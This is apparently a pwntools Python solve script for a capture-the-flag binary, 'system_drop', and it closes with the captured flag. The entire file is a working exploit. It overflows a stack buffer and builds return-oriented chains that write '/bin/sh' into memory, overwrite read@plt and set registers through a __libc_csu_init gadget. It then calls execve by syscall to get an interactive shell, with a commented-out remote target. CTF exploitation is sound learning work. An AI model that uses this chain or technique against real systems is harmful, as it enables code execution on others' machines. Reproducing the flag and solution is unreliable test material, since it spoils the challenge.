from pwn import *

local_bin = "./system_drop"
elf = ELF(local_bin)
rop = ROP(elf)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

p = gdb.debug(local_bin, '''
	break *0x400564
	continue
	''')
#p = process(local_bin)

#p = remote('178.62.10.52' ,32462)

POPRDI_gadget = (rop.find_gadget(['pop rdi','ret']))[0]
print("POP_RDI_Gadget = ", hex(POPRDI_gadget))

POPRSI_gadget = (rop.find_gadget(['pop rsi','pop r15', 'ret']))[0]
print("POP_RSI_Gadget = ", hex(POPRSI_gadget))

OFFSET_MAIN_PLT = elf.symbols['main']
print("MAIN_PLT = ", hex(OFFSET_MAIN_PLT))

OFFSET_READS_PLT = elf.symbols['read']
print("OFFSET_READS_PLT = ", hex(OFFSET_READS_PLT))

OFFSET_syscall = 0x40053b

payload = b'A' * 0x28
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget)
payload += p64(0x0)
payload += p64(POPRSI_gadget) 
payload += p64(0x601080)
payload += p64(POPRDI_gadget+1)	#junk to pop into r15 
payload += p64(POPRDI_gadget+1)	#junk to pop into r15 
#payload += p64(0x400553) #Loads rbp-0x20 into rax!
payload += p64(OFFSET_READS_PLT)
#RSP here = 0x7fffffffe538
payload += p64(OFFSET_MAIN_PLT)


p.sendline(payload)

time.sleep(3)
print("Now triggered another read!")

payload = b'/bin/sh\x00'
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(0x4005d1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(0x6010b0+8) 
payload += p64(0x3b) 


p.sendline(payload)
time.sleep(3)

print("[+] /bin/sh stored in 0x601080!")
print("[+] Restarting binary!!!")

'''
rdi = 0x601080
rsi = 0
rdx
rax = 0x3b
'''


payload = b'A' * 0x8
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(POPRDI_gadget+1) 
payload += p64(0x5b) 			#This overwrites the rbp

#This section is to overwrite read@plt to just a pop and ret ROP gadget
payload += p64(POPRDI_gadget)
payload += p64(0x0)
payload += p64(POPRSI_gadget) 
payload += p64(0x601020)
payload += p64(POPRDI_gadget+1)	#junk to pop into r15 
payload += p64(POPRDI_gadget+1)	#junk to pop into r15 
payload += p64(OFFSET_READS_PLT)
########################################################################

#This will be returned after read@plt = pop and ret 
#0x400553 = Loads rbp-0x20 into rax! ---> This is to get the sysexecve for syscall
#Subsequently read@plt is called which pop and ret back to stack since it has been overwritten on top
payload += p64(0x400553) 	

payload += p64(0x4005cc) 	#ROP gadget for pop r12,r12,r15,r15

payload += p64(0x601080+8)	#to be pop into r12. We need this for below branch
#   0x4005b0 <__libc_csu_init+64>     mov    rdx, r15
#   0x4005b3 <__libc_csu_init+67>     mov    rsi, r14
#   0x4005b6 <__libc_csu_init+70>     mov    edi, r13d
# â–º 0x4005b9 <__libc_csu_init+73>     call   qword ptr [r12 + rbx*8] <__libc_csu_init+100>
#	r12 + rbx*8 will be pointing to the place after /bin/sh
#	Since rbx = 0, r12 + rbx*8 will be 0x601080+8
#	This loop is useful for making rdx = 0 for sys_execve

payload += p64(0x0)			#pop into r13	
payload += p64(0x0)			#pop into r14	
payload += p64(0x0)			#pop into r15, used for sys_execve	
payload += p64(POPRDI_gadget+1) 
payload += p64(0x4005b0)	#To jump into the above branch
payload += p64(0)			#junk instruction

##################################################################################
#Once we returned from above, rdx=0 and rax=0x3b

payload += p64(POPRDI_gadget)
payload += p64(0x601080)	#address of /bin/sh

payload += p64(POPRSI_gadget) #pop rsi
payload += p64(0)
payload += p64(0x0)	#junk to be popped into r15
payload += p64(OFFSET_syscall)	#Syscall for execve

p.sendline(payload)

time.sleep(5)
print("[+] Overwriting my read!!!")

#for overwriting read@plt
payload = p64(POPRDI_gadget)
p.send(payload)


p.interactive()


'''

CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}

'''